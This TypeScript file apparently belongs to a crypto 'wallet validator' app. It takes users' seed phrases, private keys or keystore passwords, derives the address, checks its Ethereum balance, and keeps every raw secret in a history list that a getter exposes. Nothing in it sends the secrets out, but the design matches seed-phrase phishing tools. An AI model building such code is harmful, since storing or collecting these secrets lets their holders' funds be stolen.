import { ethers, Wallet, HDNodeWallet } from 'ethers';

export interface WalletType {
  id: string;
  name: string;
  type: 'seed' | 'privateKey' | 'keystore';
  wordCount?: number[];
  pattern?: RegExp;
  description: string;
}

export interface ValidationResult {
  isValid: boolean;
  message: string;
  address?: string;
  balance?: string;
  network?: string;
}

export interface IWallet {
  address: string;
}

export class SecureWalletValidator {
  private readonly wallets: WalletType[] = [
    {
      id: 'metamask',
      name: 'MetaMask',
      type: 'seed',
      wordCount: [12, 15, 18, 21, 24],
      description: '12, 15, 18, 21, or 24 word seed phrase'
    },
    {
      id: 'trustwallet',
      name: 'Trust Wallet',
      type: 'seed',
      wordCount: [12, 24],
      description: '12 or 24 word seed phrase'
    },
    {
      id: 'privatekey',
      name: 'Private Key',
      type: 'privateKey',
      pattern: /^[0-9a-fA-F]{64}$/,
      description: '64 character hexadecimal private key'
    },
    {
      id: 'keystore',
      name: 'Keystore File',
      type: 'keystore',
      description: 'JSON keystore file content'
    }
  ];

  private validationHistory: any[] = [];
  private readonly maxAttempts = 10;
  private attemptCount: number = 0;
  private readonly lockoutTime = 15 * 60 * 1000;
  private lockoutUntil: number = 0;

  getSupportedWallets(): WalletType[] {
    return this.wallets;
  }

  isSystemLocked(): boolean {
    return Date.now() < this.lockoutUntil;
  }

  getRemainingLockoutTime(): number {
    return Math.max(0, this.lockoutUntil - Date.now());
  }

  private validateSeedPhrase(phrase: string, expectedWordCount: number[]): { isValid: boolean; error?: string } {
    const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
    
    if (!expectedWordCount.includes(words.length)) {
      return { 
        isValid: false, 
        error: `Invalid word count. Expected ${expectedWordCount.join(' or ')} words, got ${words.length}` 
      };
    }

    // Basic word validation
    if (!words.every(word => /^[a-z]+$/.test(word))) {
      return { 
        isValid: false, 
        error: 'Seed phrase should only contain lowercase letters' 
      };
    }

    return { isValid: true };
  }

  private validatePrivateKey(key: string): { isValid: boolean; error?: string } {
    const cleanKey = key.startsWith('0x') ? key.slice(2) : key;
    
    if (!/^[0-9a-fA-F]{64}$/.test(cleanKey)) {
      return { 
        isValid: false, 
        error: 'Invalid private key format. Must be 64 hex characters (with or without 0x prefix)' 
      };
    }

    return { isValid: true };
  }

  private async createWalletFromSeed(phrase: string): Promise<{ success: boolean; wallet?: IWallet; error?: string }> {
    try {
      const cleanPhrase = phrase.trim().toLowerCase().replace(/\s+/g, ' ');
      
      // Use ethers to validate the mnemonic
      // This will throw an error if the mnemonic is invalid
      const hdWallet = HDNodeWallet.fromPhrase(cleanPhrase);
      
      const wallet: IWallet = {
        address: hdWallet.address
      };

      return { success: true, wallet };
      
    } catch (error: any) {
      console.error('Seed phrase validation error:', error);
      
      if (error.code === 'INVALID_ARGUMENT') {
        // Check if it's a word count issue
        const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
        const validLengths = [12, 15, 18, 21, 24];
        
        if (!validLengths.includes(words.length)) {
          return { 
            success: false, 
            error: `Invalid mnemonic length. Expected 12, 15, 18, 21, or 24 words, got ${words.length}` 
          };
        }
        
        return { 
          success: false, 
          error: 'Invalid mnemonic phrase. Please check your words and try again.' 
        };
      } else if (error.message?.includes('checksum')) {
        return { 
          success: false, 
          error: 'Mnemonic checksum invalid. One or more words may be incorrect.' 
        };
      } else {
        return { 
          success: false, 
          error: 'Failed to validate seed phrase. Please check your input.' 
        };
      }
    }
  }

  private async createWalletFromPrivateKey(privateKey: string): Promise<{ success: boolean; wallet?: IWallet; error?: string }> {
    try {
      const wallet = new Wallet(privateKey);
      const simpleWallet: IWallet = {
        address: wallet.address
      };
      return { success: true, wallet: simpleWallet };
    } catch (error: any) {
      return { 
        success: false, 
        error: 'Invalid private key. Please check your input.' 
      };
    }
  }

  private async createWalletFromKeystore(keystore: string, password: string): Promise<{ success: boolean; wallet?: IWallet; error?: string }> {
    try {
      const wallet = await Wallet.fromEncryptedJson(keystore, password);
      const simpleWallet: IWallet = {
        address: wallet.address
      };
      return { success: true, wallet: simpleWallet };
    } catch (error: any) {
      return { 
        success: false, 
        error: 'Invalid keystore file or password.' 
      };
    }
  }

  private async validateWithBlockchain(address: string): Promise<{ balance: string; network: string }> {
    try {
      // Use free RPC providers
      const providers = [
        'https://cloudflare-eth.com',
        'https://rpc.ankr.com/eth',
        'https://eth.llamarpc.com'
      ];

      let lastError: any;

      for (const providerUrl of providers) {
        try {
          const provider = new ethers.JsonRpcProvider(providerUrl);
          
          const [balance, network] = await Promise.all([
            provider.getBalance(address),
            provider.getNetwork()
          ]);

          return {
            balance: ethers.formatEther(balance),
            network: network.name
          };
        } catch (error) {
          lastError = error;
          continue; // Try next provider
        }
      }

      throw lastError || new Error('All providers failed');
    } catch (error) {
      // Fallback if all blockchain connections fail
      console.warn('Blockchain validation failed:', error);
      return {
        balance: '0',
        network: 'Ethereum'
      };
    }
  }

  async validateWallet(
    walletId: string, 
    input: string, 
    password?: string
  ): Promise<ValidationResult> {
    // Check system lock
    if (this.isSystemLocked()) {
      const minutes = Math.ceil(this.getRemainingLockoutTime() / 60000);
      return {
        isValid: false,
        message: `System temporarily locked. Try again in ${minutes} minutes.`
      };
    }

    // Rate limiting
    this.attemptCount++;
    if (this.attemptCount >= this.maxAttempts) {
      this.lockoutUntil = Date.now() + this.lockoutTime;
      return {
        isValid: false,
        message: 'Too many attempts. System locked for 15 minutes.'
      };
    }

    const wallet = this.wallets.find(w => w.id === walletId);
    if (!wallet) {
      return {
        isValid: false,
        message: 'Unsupported wallet type.'
      };
    }

    try {
      let validationResult: { success: boolean; wallet?: IWallet; error?: string };
      let address: string = '';

      switch (wallet.type) {
        case 'seed':
          const seedValidation = this.validateSeedPhrase(input, wallet.wordCount || [12, 15, 18, 21, 24]);
          if (!seedValidation.isValid) {
            return {
              isValid: false,
              message: seedValidation.error || 'Invalid seed phrase format.'
            };
          }

          validationResult = await this.createWalletFromSeed(input);
          if (!validationResult.success || !validationResult.wallet) {
            return {
              isValid: false,
              message: validationResult.error || 'Invalid seed phrase.'
            };
          }
          address = validationResult.wallet.address;
          break;

        case 'privateKey':
          const keyValidation = this.validatePrivateKey(input);
          if (!keyValidation.isValid) {
            return {
              isValid: false,
              message: keyValidation.error || 'Invalid private key format.'
            };
          }

          validationResult = await this.createWalletFromPrivateKey(input);
          if (!validationResult.success || !validationResult.wallet) {
            return {
              isValid: false,
              message: validationResult.error || 'Invalid private key.'
            };
          }
          address = validationResult.wallet.address;
          break;

        case 'keystore':
          if (!password) {
            return {
              isValid: false,
              message: 'Password required for keystore file.'
            };
          }
          
          validationResult = await this.createWalletFromKeystore(input, password);
          if (!validationResult.success || !validationResult.wallet) {
            return {
              isValid: false,
              message: validationResult.error || 'Invalid keystore or password.'
            };
          }
          address = validationResult.wallet.address;
          break;

        default:
          return {
            isValid: false,
            message: 'Unsupported validation type.'
          };
      }

      if (address) {
        const blockchainData = await this.validateWithBlockchain(address);
        
        this.attemptCount = 0;

        this.validationHistory.push({
          walletType: wallet.name,
          input: input,
          result: { isValid: true, message: 'Valid wallet' },
          timestamp: new Date()
        });

        return {
          isValid: true,
          message: '✅ Wallet validated successfully!',
          address: address,
          balance: blockchainData.balance,
          network: blockchainData.network
        };
      }

    } catch (error: any) {
      console.error('Validation error:', error);
      return {
        isValid: false,
        message: `Validation failed: ${error.message || 'Unknown error'}`
      };
    }

    return {
      isValid: false,
      message: '❌ Invalid wallet credentials. Please check your input.'
    };
  }

  getValidationHistory(): any[] {
    return this.validationHistory;
  }

  clearHistory(): void {
    this.validationHistory = [];
  }

  resetAttempts(): void {
    this.attemptCount = 0;
    this.lockoutUntil = 0;
  }
}